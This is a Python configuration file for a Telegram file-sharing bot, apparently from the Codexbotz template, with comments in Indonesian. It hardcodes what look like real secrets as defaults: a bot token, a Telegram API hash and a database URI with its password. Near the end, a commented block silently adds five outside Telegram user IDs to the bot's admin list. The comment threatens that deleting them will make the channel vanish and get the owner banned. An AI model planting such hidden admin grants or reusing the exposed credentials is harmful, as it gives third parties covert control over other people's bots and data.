# (©)Codexbotz

import logging
import os
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "5478381823:AAFb6e4EqyjZKml7bHHFMnSY7K1F9E1IJAg")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "6244159"))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "3f15b21827506cb63890f756743be15f")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1001401283055"))

# OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", "1494610306"))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "skandalid")

# Database
DB_URI = os.environ.get("DATABASE_URL", "postgres://oaevhbjb:dKxe0n7z9WIlPR3eFeySxKp2uDMdBSxu@queenie.db.elephantsql.com/oaevhbjb")

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "-1001652331980"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>Silahkan Tekan Tombol Join Jika Kamu Belum Join Untuk Menggunakan Bot Ini.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "1494610306 2113034787 5241534420 5137157066 5116548438 5260047391 5226710611 5313671755").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}\n\nSilahkan Tekan Tombol Join Jika Kamu Belum Join Untuk Menggunakan Bot Ini.\n\nJika Bot Tidak Merespon Kemungkinan Sedang Delay Karna Banyak Yang Pakai Jadi Bersabar 3-5Menit!!!</b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"

ADMINS.append(OWNER_ID)
# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
ADMINS.extend((OWNER_ID, 844432220, 1250450587, 1750080384, 2102118281))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
